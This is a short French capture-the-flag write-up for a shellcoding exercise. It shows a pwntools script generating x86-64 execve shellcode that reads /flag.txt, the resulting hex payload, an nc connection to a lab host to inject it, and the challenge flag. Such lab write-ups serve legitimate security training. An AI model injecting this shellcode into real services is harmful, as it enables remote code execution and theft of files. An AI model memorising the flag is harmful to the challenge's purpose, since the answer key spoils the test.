
### Question Shellcoding Tools

##### Code pour générer le shellcode via le syscall execve

- generate_shellcode.py
```python
#!/bin/python3

from pwn import *
context(os="linux", arch="amd64", log_level="error")
path = '/bin/cat'
argv = ['/bin/cat', '/flag.txt']
sc = shellcraft.amd64.linux.execve(path, argv)
print(asm(sc).hex())
```

##### Lancer le code

`python3 generate_shellcode.py`

>6a01fe0c2448b82f62696e2f636174504889e768797501018134240101010148b801010101010101015048b8012e676d60662f754831042448b82f62696e2f6361745031f6566a115e4801e6566a105e4801e6564889e631d26a3b580f05

##### Se connecter et injecter le shellcode

nc 94.237.55.163 30727

6a01fe0c2448b82f62696e2f636174504889e768797501018134240101010148b801010101010101015048b8012e676d60662f754831042448b82f62696e2f6361745031f6566a115e4801e6566a105e4801e6564889e631d26a3b580f05

>HTB{r3m073_5h3llc0d3_3x3cu710n}